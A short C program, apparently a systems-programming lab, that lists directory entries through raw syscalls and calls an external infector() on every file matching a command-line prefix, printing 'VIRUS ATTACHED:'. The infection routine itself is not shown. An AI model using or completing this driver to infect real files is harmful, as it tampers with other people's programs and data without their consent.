#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

struct ent {
  unsigned long inode;
  int offset;
  unsigned short len;
  char buf[];
};

extern int system_call();
extern void infector();

int main(int argc, char *argv[], char *envp[]) {

  int fd;
  int read;
  char buf[8192];
  struct ent* entp;
  char* prefix = 0;


  /* loop over command line arguments to find a prefix */
  int i = 1;
  while (i < argc) {  
        if (strncmp(argv[i], "-a", 2) == 0) {
            prefix = argv[i] + 2;
            break;
        }
        i++;
    }


  fd = system_call(SYS_OPEN, ".", 0, 0777);
  
  if (fd < 0) {
    system_call(SYS_WRITE, STDOUT, "Error opening file\n", 19);
    return 0;
  }

  read = system_call(141, fd, buf, 8192);
  entp = (struct ent *) buf;

  /* loop through the directory entries */
  while ((char *) entp < buf + read) {

    /* skip current and parent directory*/
    if (strcmp(entp->buf, ".") == 0 || strcmp(entp->buf, "..") == 0) {
      entp = (struct ent *)((char *)entp + entp->len);
      continue;
    }
    if(prefix){
      if(strncmp(entp->buf, prefix, strlen(prefix)) == 0){
        infector(entp->buf);
        system_call(SYS_WRITE, STDOUT, "VIRUS ATTACHED:", 15);
      }
    }

    /* print the directory to stdout */
    system_call(SYS_WRITE, STDOUT, entp->buf, strlen(entp->buf));
    system_call(SYS_WRITE, STDOUT, "\n", 1);

    
    entp = (struct ent *) ((char *) entp + entp->len);
  }
  
  return 0;
}